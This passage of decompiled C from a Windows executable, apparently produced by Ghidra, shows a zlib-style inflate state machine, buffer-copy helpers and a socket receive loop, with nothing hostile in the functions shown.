              uVar7 = extraout_EDX_00;
            }
          }
          else {
            FUN_0040aa6e(local_8dc,0x3ff,(short *)&DAT_0041df38);
            uVar7 = extraout_EDX_04;
          }
        }
      }
LAB_00405a42:
      if (piVar4 != (int *)0x0) {
        FUN_0040b6ac();
        uVar7 = extraout_EDX_02;
      }
    }
  }
  FUN_0040a982(local_4 ^ (uint)&local_8dc,uVar7);
  return;
}



void __fastcall
FUN_00405ac0(undefined4 *param_1,int *param_2,undefined2 *param_3,uint *param_4,short *param_5)

{
  uint uVar1;
  short *psVar2;
  undefined4 *puVar3;
  undefined2 *extraout_EDX;
  undefined2 *extraout_EDX_00;
  undefined2 *extraout_EDX_01;
  undefined2 *extraout_EDX_02;
  undefined2 *extraout_EDX_03;
  undefined2 *puVar4;
  undefined2 *extraout_EDX_04;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined8 uVar9;
  uint local_81c;
  undefined4 *local_818;
  undefined2 *local_814;
  undefined4 local_810;
  short *local_80c;
  int *local_808;
  short local_804;
  undefined local_802 [2046];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_81c;
  local_814 = param_3;
  local_804 = 0;
  local_818 = param_1;
  local_808 = param_2;
  FUN_0040f8c0((undefined (*) [16])local_802,0,0x7fe);
  local_80c = &local_804;
  if (param_5 != (short *)0x0) {
    local_80c = param_5;
  }
  psVar2 = local_80c;
  *local_80c = 0;
  local_810 = 0;
  puVar4 = extraout_EDX;
  if ((*param_2 != 0) && (local_818 != (undefined4 *)0x0)) {
    local_81c = 0x1000;
    puVar3 = (undefined4 *)FUN_0040b8c1(0x1000);
    uVar9 = FUN_004058c0(&local_81c,psVar2,local_808,puVar3);
    puVar4 = (undefined2 *)((ulonglong)uVar9 >> 0x20);
    uVar6 = local_81c;
    if (((int)uVar9 != 0) && (uVar5 = local_81c - 6, -1 < (int)uVar5)) {
      *local_814 = *(undefined2 *)puVar3;
      uVar6 = *param_4;
      puVar4 = *(undefined2 **)((int)puVar3 + 2);
      local_814 = puVar4;
      if ((int)uVar6 < (int)uVar5) {
        uVar8 = 0;
        if (0 < (int)uVar6) {
          FUN_00410450(local_818,(undefined4 *)((int)puVar3 + 6),uVar6);
          uVar8 = *param_4;
          puVar4 = extraout_EDX_01;
        }
      }
      else {
        FUN_00410450(local_818,(undefined4 *)((int)puVar3 + 6),uVar5);
        puVar4 = extraout_EDX_00;
        uVar8 = uVar5;
      }
      uVar7 = uVar8;
      if ((int)uVar5 < (int)local_814) {
        do {
          local_81c = 0x1000;
          uVar9 = FUN_004058c0(&local_81c,local_80c,local_808,puVar3);
          uVar1 = local_81c;
          puVar4 = (undefined2 *)((ulonglong)uVar9 >> 0x20);
          uVar6 = local_81c;
          if (((int)uVar9 == 0) || (uVar6 = uVar5 + local_81c, 0x10000 < (int)uVar6))
          goto LAB_00405c4f;
          uVar5 = *param_4;
          uVar8 = uVar7 + local_81c;
          local_81c = uVar6;
          if ((int)uVar5 < (int)uVar8) {
            uVar8 = uVar7;
            if ((int)uVar7 < (int)uVar5) {
              FUN_00410450((undefined4 *)((int)local_818 + uVar7),puVar3,uVar5 - uVar7);
              uVar8 = *param_4;
              puVar4 = extraout_EDX_03;
            }
          }
          else {
            FUN_00410450((undefined4 *)((int)local_818 + uVar7),puVar3,uVar1);
            puVar4 = extraout_EDX_02;
          }
          uVar5 = local_81c;
          uVar7 = uVar8;
        } while ((int)local_81c < (int)local_814);
      }
      *param_4 = uVar8;
      local_810 = 1;
      uVar6 = local_81c;
    }
LAB_00405c4f:
    local_81c = uVar6;
    if (puVar3 != (undefined4 *)0x0) {
      FUN_0040b6ac();
      puVar4 = extraout_EDX_04;
    }
  }
  FUN_0040a982(local_4 ^ (uint)&local_81c,puVar4);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00405c80(undefined4 param_1)

{
  int iVar1;
  undefined4 extraout_EDX;
  undefined4 *unaff_EBX;
  uint uVar2;
  undefined8 uVar3;
  uint uStack_101c;
  undefined4 uStack_1018;
  undefined local_100c [4];
  undefined4 local_1008;
  uint uStack_14;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_100c;
  uVar2 = 0;
  uStack_1018 = 0;
  uStack_101c = 4;
  local_1008 = param_1;
  uVar3 = Ordinal_16(*unaff_EBX,local_100c);
  if ((int)uVar3 != 4) {
    FUN_0040a982(uStack_14 ^ (uint)&uStack_101c,(int)((ulonglong)uVar3 >> 0x20));
    return;
  }
  if (uStack_101c != 0) {
    do {
      iVar1 = Ordinal_16(*unaff_EBX,&stack0xffffefec,0x1000,0);
      if (iVar1 == 0) break;
      FUN_0040b59c();
      uVar2 = uVar2 + iVar1;
      _DAT_0042471c = uVar2;
    } while (uVar2 < uStack_101c);
  }
  FUN_0040b3be();
  FUN_0040a982(uStack_14 ^ (uint)&uStack_101c,extraout_EDX);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall
FUN_00405d50(undefined4 param_1,void **param_2,undefined4 param_3,undefined4 param_4)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  void *extraout_EDX;
  void *extraout_EDX_00;
  void *pvVar4;
  undefined8 uVar5;
  undefined auStack_244 [4];
  void **local_240;
  int local_23c;
  undefined2 local_238;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  void *local_10;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)auStack_244;
  local_240 = param_2;
  piVar3 = FUN_00409f30(param_3,param_1);
  pvVar4 = extraout_EDX;
  if (piVar3 != (int *)0x0) {
    if (*piVar3 == 1) {
      piVar1 = (int *)piVar3[1];
      if (*(uint *)(*piVar1 + 4) < 0x80000000) {
        if (piVar1[1] != -1) {
          FUN_00409590();
          param_2 = local_240;
        }
        piVar1[1] = -1;
        local_30 = 0;
        local_2c = 0;
        local_28 = 0;
        local_24 = 0;
        local_20 = 0;
        local_1c = 0;
        local_18 = 0;
        local_14 = 0;
        _DAT_00425358 = 0;
      }
      else {
        _DAT_00425358 = 0x10000;
      }
    }
    else {
      _DAT_00425358 = 0x80000;
    }
    local_23c = 0;
    local_238 = 0;
    local_10 = (void *)0x0;
    if (*piVar3 == 1) {
      uVar5 = FUN_004097b0((int *)piVar3[1],(char **)0x0,(char **)0x0,&local_23c);
    }
    else {
      uVar5 = 0x80000;
    }
    _DAT_00425358 = (undefined4)uVar5;
    if (*piVar3 == 1) {
      _DAT_00425358 = FUN_00409d70(param_4,(int)((ulonglong)uVar5 >> 0x20),param_4,*param_2);
    }
    else {
      _DAT_00425358 = 0x80000;
    }
    *param_2 = local_10;
    if (*piVar3 == 1) {
      iVar2 = piVar3[1];
      _DAT_00425358 = FUN_00409ed0();
      if (iVar2 != 0) {
        FUN_00409fe0();
      }
      FUN_0040b6ac();
      pvVar4 = extraout_EDX_00;
    }
    else {
      _DAT_00425358 = 0x80000;
      pvVar4 = local_10;
    }
  }
  FUN_0040a982(local_8 ^ (uint)auStack_244,pvVar4);
  return;
}



int __cdecl FUN_00405ed0(int param_1)

{
  uint uVar1;
  undefined4 uVar2;
  int unaff_EBX;
  undefined4 *puVar3;
  int unaff_ESI;
  undefined4 *puVar4;
  uint uVar5;
  undefined4 *local_4;
  
  local_4 = *(undefined4 **)(unaff_EBX + 0xc);
  puVar3 = *(undefined4 **)(unaff_ESI + 0x30);
  puVar4 = *(undefined4 **)(unaff_ESI + 0x34);
  if (puVar4 < puVar3) {
    puVar4 = *(undefined4 **)(unaff_ESI + 0x2c);
  }
  uVar1 = *(uint *)(unaff_EBX + 0x10);
  uVar5 = (int)puVar4 - (int)puVar3;
  if (uVar1 < (uint)((int)puVar4 - (int)puVar3)) {
    uVar5 = uVar1;
  }
  if ((uVar5 != 0) && (param_1 == -5)) {
    param_1 = 0;
  }
  *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar5;
  *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar5;
  if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
    uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),puVar3,uVar5);
    *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
    *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
  }
  if (uVar5 != 0) {
    FUN_00410450(local_4,puVar3,uVar5);
    local_4 = (undefined4 *)((int)local_4 + uVar5);
    puVar3 = (undefined4 *)((int)puVar3 + uVar5);
  }
  if (puVar3 == *(undefined4 **)(unaff_ESI + 0x2c)) {
    puVar3 = *(undefined4 **)(unaff_ESI + 0x28);
    if (*(undefined4 **)(unaff_ESI + 0x34) == *(undefined4 **)(unaff_ESI + 0x2c)) {
      *(undefined4 **)(unaff_ESI + 0x34) = puVar3;
    }
    uVar1 = *(uint *)(unaff_EBX + 0x10);
    uVar5 = *(int *)(unaff_ESI + 0x34) - (int)puVar3;
    if (uVar1 < uVar5) {
      uVar5 = uVar1;
    }
    if ((uVar5 != 0) && (param_1 == -5)) {
      param_1 = 0;
    }
    *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar5;
    *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar5;
    if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
      uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),puVar3,uVar5);
      *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
      *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
    }
    if (uVar5 != 0) {
      FUN_00410450(local_4,puVar3,uVar5);
      local_4 = (undefined4 *)((int)local_4 + uVar5);
      puVar3 = (undefined4 *)((int)puVar3 + uVar5);
    }
  }
  *(undefined4 **)(unaff_EBX + 0xc) = local_4;
  *(undefined4 **)(unaff_ESI + 0x30) = puVar3;
  return param_1;
}



void __cdecl FUN_00405fc0(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4)

{
  int in_EAX;
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x1c);
  if (puVar1 != (undefined4 *)0x0) {
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    *puVar1 = 0;
    puVar1[5] = param_3;
    puVar1[6] = param_4;
  }
  return;
}



void __thiscall FUN_00406000(void *this,int param_1)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  undefined *puVar4;
  byte **in_EAX;
  uint uVar5;
  undefined *puVar6;
  undefined *puVar7;
  byte *pbVar8;
  uint uVar9;
  uint local_1c;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  undefined *local_8;
  
  local_1c = *(uint *)((int)this + 0x20);
  piVar2 = *(int **)((int)this + 4);
  local_14 = in_EAX[1];
  pbVar8 = *in_EAX;
  puVar7 = *(undefined **)((int)this + 0x34);
  uVar9 = *(uint *)((int)this + 0x1c);
  if (puVar7 < *(undefined **)((int)this + 0x30)) {
    local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
  }
  else {
    local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
  }
  iVar3 = *piVar2;
  do {
    puVar6 = puVar7;
    switch(iVar3) {
    case 0:
      if ((local_10 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
LAB_004060f0:
        piVar2[3] = (uint)*(byte *)(piVar2 + 4);
        piVar2[2] = piVar2[5];
        *piVar2 = 1;
        goto switchD_00406048_caseD_1;
      }
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar9;
      in_EAX[1] = local_14;
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      *in_EAX = pbVar8;
      *(undefined **)((int)this + 0x34) = puVar7;
      param_1 = FUN_004078d0((uint)*(byte *)(piVar2 + 4),(uint)*(byte *)((int)piVar2 + 0x11),
                             piVar2[5],piVar2[6],(int)this,in_EAX);
      local_14 = in_EAX[1];
      local_1c = *(uint *)((int)this + 0x20);
      pbVar8 = *in_EAX;
      uVar9 = *(uint *)((int)this + 0x1c);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (puVar7 < *(undefined **)((int)this + 0x30)) {
        local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
      }
      else {
        local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
      }
      if (param_1 == 0) goto LAB_004060f0;
      *piVar2 = (uint)(param_1 != 1) * 2 + 7;
      goto LAB_00406537;
    case 1:
switchD_00406048_caseD_1:
      for (; uVar9 < (uint)piVar2[3]; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) {
LAB_00406575:
          *(uint *)((int)this + 0x20) = local_1c;
          *(uint *)((int)this + 0x1c) = uVar9;
          in_EAX[1] = (byte *)0x0;
          in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
          *in_EAX = pbVar8;
          *(undefined **)((int)this + 0x34) = puVar7;
          FUN_00405ed0(param_1);
          return;
        }
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      local_c = (byte *)(piVar2[2] + (*(uint *)(&DAT_0041e5e0 + piVar2[3] * 4) & local_1c) * 8);
      local_1c = local_1c >> (local_c[1] & 0x1f);
      uVar9 = uVar9 - local_c[1];
      bVar1 = *local_c;
      uVar5 = (uint)bVar1;
      if (uVar5 == 0) {
        piVar2[2] = *(int *)(local_c + 4);
        *piVar2 = 6;
        goto LAB_00406537;
      }
      if ((bVar1 & 0x10) != 0) {
        piVar2[2] = uVar5 & 0xf;
        piVar2[1] = *(int *)(local_c + 4);
        *piVar2 = 2;
        goto LAB_00406537;
      }
      if ((bVar1 & 0x40) == 0) goto LAB_004061c3;
      if ((bVar1 & 0x20) != 0) {
        *piVar2 = 7;
        goto LAB_00406537;
      }
      *piVar2 = 9;
      in_EAX[6] = (byte *)s_invalid_literal_length_code_0041fdc4;
      param_1 = -3;
      goto LAB_00406548;
    case 2:
      uVar5 = piVar2[2];
      for (; uVar9 < uVar5; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00406575;
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      piVar2[1] = piVar2[1] + (*(uint *)(&DAT_0041e5e0 + uVar5 * 4) & local_1c);
      local_1c = local_1c >> ((byte)uVar5 & 0x1f);
      uVar9 = uVar9 - uVar5;
      piVar2[3] = (uint)*(byte *)((int)piVar2 + 0x11);
      piVar2[2] = piVar2[6];
      *piVar2 = 3;
      break;
    case 3:
      break;
    case 4:
      uVar5 = piVar2[2];
      for (; uVar9 < uVar5; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00406575;
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      piVar2[3] = piVar2[3] + (*(uint *)(&DAT_0041e5e0 + uVar5 * 4) & local_1c);
      local_1c = local_1c >> ((byte)uVar5 & 0x1f);
      uVar9 = uVar9 - uVar5;
      *piVar2 = 5;
    case 5:
      local_8 = puVar7 + -piVar2[3];
      if (local_8 < *(undefined **)((int)this + 0x28)) {
        do {
          local_8 = local_8 + (*(int *)((int)this + 0x2c) - (int)*(undefined **)((int)this + 0x28));
        } while (local_8 < *(undefined **)((int)this + 0x28));
      }
      iVar3 = piVar2[1];
      while (iVar3 != 0) {
        puVar6 = puVar7;
        if (local_10 == (undefined *)0x0) {
          if (puVar7 == *(undefined **)((int)this + 0x2c)) {
            local_10 = *(undefined **)((int)this + 0x30);
            puVar6 = *(undefined **)((int)this + 0x28);
            if (local_10 != puVar6) {
              if (puVar6 < local_10) {
                local_10 = local_10 + (-1 - (int)puVar6);
              }
              else {
                local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
              }
              puVar7 = puVar6;
              if (local_10 != (undefined *)0x0) goto LAB_0040644d;
            }
          }
          *(undefined **)((int)this + 0x34) = puVar7;
          param_1 = FUN_00405ed0(param_1);
          puVar6 = *(undefined **)((int)this + 0x34);
          if (puVar6 < *(undefined **)((int)this + 0x30)) {
            local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
          }
          else {
            local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
          }
          if (puVar6 == *(undefined **)((int)this + 0x2c)) {
            puVar7 = *(undefined **)((int)this + 0x28);
            puVar4 = *(undefined **)((int)this + 0x30);
            if (puVar4 != puVar7) {
              puVar6 = puVar7;
              if (puVar7 < puVar4) {
                local_10 = puVar4 + (-1 - (int)puVar7);
              }
              else {
                local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
              }
            }
          }
          if (local_10 == (undefined *)0x0) goto LAB_004065b8;
        }
LAB_0040644d:
        *puVar6 = *local_8;
        local_8 = local_8 + 1;
        local_10 = local_10 + -1;
        puVar7 = puVar6 + 1;
        param_1 = 0;
        if (local_8 == *(undefined **)((int)this + 0x2c)) {
          local_8 = *(undefined **)((int)this + 0x28);
        }
        piVar2[1] = piVar2[1] + -1;
        iVar3 = piVar2[1];
      }
LAB_00406531:
      *piVar2 = 0;
      goto LAB_00406537;
    case 6:
      if (local_10 == (undefined *)0x0) {
        if (puVar7 == *(undefined **)((int)this + 0x2c)) {
          local_10 = *(undefined **)((int)this + 0x30);
          puVar6 = *(undefined **)((int)this + 0x28);
          if (local_10 != puVar6) {
            if (puVar6 < local_10) {
              local_10 = local_10 + (-1 - (int)puVar6);
            }
            else {
              local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
            }
            puVar7 = puVar6;
            if (local_10 != (undefined *)0x0) goto LAB_00406516;
          }
        }
        *(undefined **)((int)this + 0x34) = puVar7;
        param_1 = FUN_00405ed0(param_1);
        puVar6 = *(undefined **)((int)this + 0x34);
        if (puVar6 < *(undefined **)((int)this + 0x30)) {
          local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
        }
        else {
          local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
        }
        if (puVar6 == *(undefined **)((int)this + 0x2c)) {
          puVar7 = *(undefined **)((int)this + 0x28);
          puVar4 = *(undefined **)((int)this + 0x30);
          if (puVar4 != puVar7) {
            puVar6 = puVar7;
            if (puVar7 < puVar4) {
              local_10 = puVar4 + (-1 - (int)puVar7);
            }
            else {
              local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
            }
          }
        }
        if (local_10 == (undefined *)0x0) {
LAB_004065b8:
          *(uint *)((int)this + 0x20) = local_1c;
          *(uint *)((int)this + 0x1c) = uVar9;
          in_EAX[1] = local_14;
          in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
          goto LAB_00406560;
        }
      }
LAB_00406516:
      *puVar6 = *(undefined *)(piVar2 + 2);
      puVar7 = puVar6 + 1;
      local_10 = local_10 + -1;
      param_1 = 0;
      goto LAB_00406531;
    case 7:
      if (7 < uVar9) {
        local_14 = local_14 + 1;
        uVar9 = uVar9 - 8;
        pbVar8 = pbVar8 + -1;
      }
      *(undefined **)((int)this + 0x34) = puVar7;
      param_1 = FUN_00405ed0(param_1);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (*(undefined **)((int)this + 0x30) == puVar7) {
        *piVar2 = 8;
switchD_00406048_caseD_8:
        param_1 = 1;
LAB_00406548:
        *(uint *)((int)this + 0x20) = local_1c;
        *(uint *)((int)this + 0x1c) = uVar9;
        in_EAX[1] = local_14;
      }
      else {
        *(uint *)((int)this + 0x20) = local_1c;
        *(uint *)((int)this + 0x1c) = uVar9;
        in_EAX[1] = local_14;
      }
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      puVar6 = puVar7;
LAB_00406560:
      *in_EAX = pbVar8;
      *(undefined **)((int)this + 0x34) = puVar6;
      FUN_00405ed0(param_1);
      return;
    case 8:
      goto switchD_00406048_caseD_8;
    case 9:
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar9;
      in_EAX[1] = local_14;
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      param_1 = -3;
      goto LAB_00406560;
    default:
      param_1 = -2;
      goto LAB_00406548;
    }
    for (; uVar9 < (uint)piVar2[3]; uVar9 = uVar9 + 8) {
      if (local_14 == (byte *)0x0) goto LAB_00406575;
      bVar1 = *pbVar8;
      local_14 = local_14 + -1;
      pbVar8 = pbVar8 + 1;
      param_1 = 0;
      local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
    }
    local_c = (byte *)(piVar2[2] + (*(uint *)(&DAT_0041e5e0 + piVar2[3] * 4) & local_1c) * 8);
    local_1c = local_1c >> (local_c[1] & 0x1f);
    bVar1 = *local_c;
    uVar5 = (uint)bVar1;
    uVar9 = uVar9 - local_c[1];
    if ((bVar1 & 0x10) == 0) {
      if ((bVar1 & 0x40) != 0) {
        *piVar2 = 9;
        in_EAX[6] = (byte *)s_invalid_distance_code_0041fde0;
        param_1 = -3;
        goto LAB_00406548;
      }
LAB_004061c3:
      piVar2[3] = uVar5;
      piVar2[2] = (int)(local_c + *(int *)(local_c + 4) * 8);
    }
    else {
      piVar2[2] = uVar5 & 0xf;
      piVar2[3] = *(int *)(local_c + 4);
      *piVar2 = 4;
    }
LAB_00406537:
    iVar3 = *piVar2;
  } while( true );
}



void FUN_00406670(void)

{
  int *in_EAX;
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if (in_EAX != (int *)0x0) {
    *in_EAX = unaff_ESI[0xf];
  }
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  return;
}



undefined4 * __cdecl FUN_004066e0(undefined4 param_1)

{
  int in_EAX;
  undefined4 *puVar1;
  int iVar2;
  int unaff_EBX;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x40);
  if (puVar1 != (undefined4 *)0x0) {
    iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),8,0x5a0);
    puVar1[9] = iVar2;
    if (iVar2 != 0) {
      iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1);
      puVar1[10] = iVar2;
      if (iVar2 == 0) {
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1[9]);
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
        return (undefined4 *)0x0;
      }
      puVar1[0xb] = iVar2 + unaff_EBX;
      puVar1[0xe] = param_1;
      *puVar1 = 0;
      FUN_00406670();
      return puVar1;
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
  }
  return (undefined4 *)0x0;
}



void __thiscall FUN_00406780(void *this,int param_1)

{
  int *piVar1;
  byte bVar2;
  undefined4 *puVar3;
  byte *pbVar4;
  byte **in_EAX;
  uint uVar5;
  uint uVar6;
  undefined4 uVar7;
  undefined4 *puVar8;
  int iVar9;
  byte bVar10;
  uint uVar11;
  undefined4 *puVar12;
  uint uVar13;
  uint local_28;
  undefined4 *local_24;
  byte *local_20;
  byte *local_1c;
  byte *local_18;
  int local_14;
  uint local_10;
  uint local_c;
  int local_8;
  int local_4;
  
  puVar3 = *(undefined4 **)((int)this + 0x34);
  local_20 = in_EAX[1];
  puVar12 = (undefined4 *)*in_EAX;
  uVar13 = *(uint *)((int)this + 0x1c);
  if (puVar3 < *(undefined4 **)((int)this + 0x30)) {
    local_18 = (byte *)((int)*(undefined4 **)((int)this + 0x30) + (-1 - (int)puVar3));
  }
  else {
    local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)puVar3);
  }
                    // WARNING: Load size is inaccurate
  uVar11 = *this;
  uVar6 = *(uint *)((int)this + 0x20);
  uVar5 = *(uint *)((int)this + 0x20);
  do {
    local_28 = uVar5;
    local_24 = puVar3;
    if (9 < uVar11) {
      param_1 = -2;
LAB_004067cf:
      *(uint *)((int)this + 0x20) = local_28;
LAB_004067d6:
      *(uint *)((int)this + 0x1c) = uVar13;
      in_EAX[1] = local_20;
LAB_004067e0:
      pbVar4 = *in_EAX;
      *in_EAX = (byte *)puVar12;
      in_EAX[2] = in_EAX[2] + ((int)puVar12 - (int)pbVar4);
      *(undefined4 **)((int)this + 0x34) = local_24;
      FUN_00405ed0(param_1);
      return;
    }
    switch((&switchD_00406804::switchdataD_0040716c)[uVar11]) {
    case (undefined *)0x40680b:
      iVar9 = param_1;
      for (; uVar5 = uVar6, uVar13 < 3; uVar13 = uVar13 + 8) {
        if (local_20 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = local_28;
          *(uint *)((int)this + 0x1c) = uVar13;
          in_EAX[1] = (byte *)0x0;
          goto LAB_00406ebf;
        }
        bVar2 = *(byte *)puVar12;
        local_20 = local_20 + -1;
        puVar12 = (undefined4 *)((int)puVar12 + 1);
        param_1 = 0;
        local_28 = uVar5 | (uint)bVar2 << ((byte)uVar13 & 0x1f);
        uVar6 = local_28;
        iVar9 = param_1;
      }
      *(uint *)((int)this + 0x18) = uVar5 & 1;
      param_1 = iVar9;
      switch((uVar5 & 7) >> 1) {
      case 0:
        uVar11 = uVar13 - 3 & 7;
        uVar5 = (uVar5 >> 3) >> (sbyte)uVar11;
        uVar13 = (uVar13 - 3) - uVar11;
        *(undefined4 *)this = 1;
        local_28 = uVar5;
        break;
      case 1:
        iVar9 = FUN_00405fc0(9,5,&DAT_0041e628,&DAT_0041f628);
        *(int *)((int)this + 4) = iVar9;
        if (iVar9 == 0) {
          param_1 = -4;
          goto LAB_004067cf;
        }
        uVar5 = local_28 >> 3;
        uVar13 = uVar13 - 3;
        *(undefined4 *)this = 6;
        local_28 = uVar5;
        break;
      case 2:
        uVar5 = uVar5 >> 3;
        uVar13 = uVar13 - 3;
        *(undefined4 *)this = 3;
        local_28 = uVar5;
        break;
      case 3:
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_invalid_block_type_0041fdf8;
        *(uint *)((int)this + 0x20) = local_28 >> 3;
        uVar13 = uVar13 - 3;
        param_1 = -3;
        goto LAB_004067d6;
      }
      break;
    case (undefined *)0x4068c6:
      for (; uVar13 < 0x20; uVar13 = uVar13 + 8) {
        if (local_20 == (byte *)0x0) goto LAB_00406f08;
        bVar2 = *(byte *)puVar12;
        local_20 = local_20 + -1;
        puVar12 = (undefined4 *)((int)puVar12 + 1);
        param_1 = 0;
        uVar6 = uVar6 | (uint)bVar2 << ((byte)uVar13 & 0x1f);
        local_28 = uVar6;
      }
      uVar11 = uVar6 & 0xffff;
      if (~uVar6 >> 0x10 != uVar11) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_invalid_stored_block_lengths_0041fe0c;
        goto switchD_00406804_caseD_406f30;
      }
      uVar5 = 0;
      uVar13 = 0;
      *(uint *)((int)this + 4) = uVar11;
      local_28 = 0;
      if (uVar11 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      else {
        *(undefined4 *)this = 2;
      }
      break;
    case (undefined *)0x40693a:
      if (local_20 == (byte *)0x0) {
LAB_00406f63:
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar13;
        in_EAX[1] = (byte *)0x0;
        in_EAX[2] = in_EAX[2] + ((int)puVar12 - (int)*in_EAX);
        *in_EAX = (byte *)puVar12;
        *(undefined4 **)((int)this + 0x34) = puVar3;
        FUN_00405ed0(param_1);
        return;
      }
      if (local_18 == (byte *)0x0) {
        local_18 = (byte *)0x0;
        if (puVar3 == *(undefined4 **)((int)this + 0x2c)) {
          puVar8 = *(undefined4 **)((int)this + 0x30);
          local_24 = *(undefined4 **)((int)this + 0x28);
          if (local_24 != puVar8) {
            if (local_24 < puVar8) {
              local_18 = (byte *)((int)puVar8 + (-1 - (int)local_24));
            }
            else {
              local_18 = (byte *)((int)*(undefined4 **)((int)this + 0x2c) - (int)local_24);
            }
            puVar3 = local_24;
            if (local_18 != (byte *)0x0) goto LAB_004069e7;
          }
        }
        local_24 = puVar3;
        *(undefined4 **)((int)this + 0x34) = local_24;
        iVar9 = FUN_00405ed0(param_1);
        puVar3 = *(undefined4 **)((int)this + 0x30);
        local_24 = *(undefined4 **)((int)this + 0x34);
        if (local_24 < puVar3) {
